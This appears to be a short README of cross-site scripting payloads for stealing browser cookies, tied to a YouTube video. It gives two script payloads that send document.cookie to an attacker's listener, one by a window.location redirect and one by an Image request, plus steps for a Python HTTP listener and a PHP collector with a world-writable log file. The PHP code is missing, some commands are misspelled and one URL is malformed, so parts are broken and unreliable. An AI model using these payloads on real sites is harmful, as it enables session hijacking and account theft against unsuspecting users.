# Stealling_Cookies

All Payload that used from this Youtube Video:

https://youtu.be/Kh1sgI5yLdk


Payloads:

# Takeing The Cookie From Python3 Server Listener:

1- Strat Python Server:

YasserREED > Python3 -m Server.http 3333 <- Any Port You Like!

2- write Payload with window.location() function:

<script> window.location='https://127.0.0.1/:3333?cookie='+document.cookie </script> 


# Send Cookies without go to another window :

1- Strat Python Server:

YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!

2- Write the Pyaload:

<script>
    var i = new Image();
    i.src="http://127.0.0.1:3333/?cookie="+document.cookie
</script>  


# Wirte PHP Code To Take the Cookie:

1- go to html File:

[~] YasserREED> cd  /var/www/html

2- Make File get.php:

YasserrEED> sudo gedit get.php

// Code with the File Just Copy it 

2- Make log.txt file:

YasserRED> sudo touch log.txt

3- give all Privileges:

YasserREED> sudo chmod 777 log.txt


